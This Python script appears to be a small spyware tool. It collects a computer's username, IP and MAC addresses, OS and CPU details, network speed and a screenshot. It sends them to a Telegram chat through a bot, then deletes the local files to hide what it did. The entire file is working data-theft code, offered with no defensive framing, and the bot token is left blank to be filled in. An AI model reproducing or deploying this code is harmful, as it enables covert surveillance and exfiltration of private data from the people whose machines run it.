# -*- coding: utf-8 -*- 
import getpass
import os
import socket
from datetime import datetime
from uuid import getnode as get_mac
import pyautogui
from speedtest import Speedtest
import telebot
import psutil
import platform
from PIL import Image

bot = telebot.TeleBot("")

start = datetime.now()

name = getpass.getuser()
ip = socket.gethostbyname(socket.getfqdn())
mac = get_mac()
ost = platform.uname()
inet = Speedtest()
download = float(str(inet.download())[0:2] + "."
                 + str(round(inet.download(), 2))[1]) * 0.125
uploads = float(str(inet.upload())[0:2] + "."
                + str(round(inet.download(), 2))[1]) * 0.125

zone = psutil.boot_time()
time = datetime.fromtimestamp(zone)
cpu = psutil.cpu_freq()
os.getcwd()

try:
    os.chdir(r" ")
except OSError:
    @bot.message_handler(commands=['start'])
    def start_message(message):
        bot.send_message(message.chat.id, "[Error]: Location not found!")

        bot.stop_polling()


    bot.polling()
    raise SystemExit

screen = pyautogui.screenshot("screenshot.jpg")

ends = datetime.now()
workspeed = format(ends - start)
os.getcwd()

try:
    os.chdir(r" ")
except OSError:
    @bot.message_handler(commands=['start'])
    def start_message(message):
        bot.send_message(message.chat.id, "[Error]: Location not found!")

        bot.stop_polling()


    bot.polling()
    raise SystemExit

file = open("info.txt", "w")
file.write(f"[================================================]\n  Operating System: {ost.system}\n  Processor: {ost.processor}\n  Username: {name}\n  IP adress: {ip}\n  MAC adress: {mac}\n  Timezone: {time.year}/{time.month}/{time.day} {time.hour}:{time.minute}:{time.second}\n  Work speed: {workspeed}\n  Download: {download} MB/s\n  Upload: {uploads} MB/s\n  Max Frequency: {cpu.max:.2f} Mhz\n  Min Frequency: {cpu.min:.2f} Mhz\n  Current Frequency: {cpu.current:.2f} Mhz\n[================================================]\n")
file.close()

text = "Screenshot"


@bot.message_handler(commands=['start'])
def start_message(message):
    upfile = open("\info.txt", "rb")
    uphoto = open("\screenshot.jpg", "rb")
    bot.send_photo(message.chat.id, uphoto, text)
    bot.send_document(message.chat.id, upfile)

    upfile.close()
    uphoto.close()

    os.remove("info.txt")
    os.remove("screenshot.jpg")

    bot.stop_polling()


bot.polling()
